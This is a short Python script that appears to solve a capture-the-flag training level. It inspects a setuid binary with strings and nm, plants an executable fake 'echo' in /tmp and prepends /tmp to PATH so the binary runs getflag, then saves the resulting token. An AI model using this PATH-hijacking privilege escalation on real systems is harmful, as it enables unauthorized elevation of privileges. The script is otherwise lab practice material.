import os
import sys
sys.path.append("../..")

from utils.ssh import sanitize_token, download_from, connect_by_previous, exec, save_token
from utils.text import print_title, print_output, print_magic

client = connect_by_previous()
file_name = 'level03'
download_from(file_name)

print_title('Get readable text from binary by strings')
file_content = os.popen('strings level03 | grep echo').read()
print_output(file_content, 'Interested thing')
print_title('Program execute echo command from path')

print_title('Inspect binary by nm')
binary_structure = os.popen(f'nm {file_name} | grep "set"').readlines()
print_output(binary_structure, 'Interested thing')
print_title("It's mean file change uid while executed, may be useful")

print_title(f'Remove tmp file {file_name}')
os.unlink(file_name)

print_magic('Okay time to magic')
print_title('We can write files in /tmp dir')
exec(client, 'echo "getflag" > /tmp/echo', title='Add new echo file with getflag command inside')
exec(client, 'chmod +x /tmp/echo', title='Make it executable')

token_raw = exec(client, 'PATH=/tmp/:$PATH  ./level03', title='Tricky path replacement')[0]
print_title('We done, binary execute our echo file and we avoid restriction')

token = sanitize_token(token_raw)
save_token(token)

client.close()
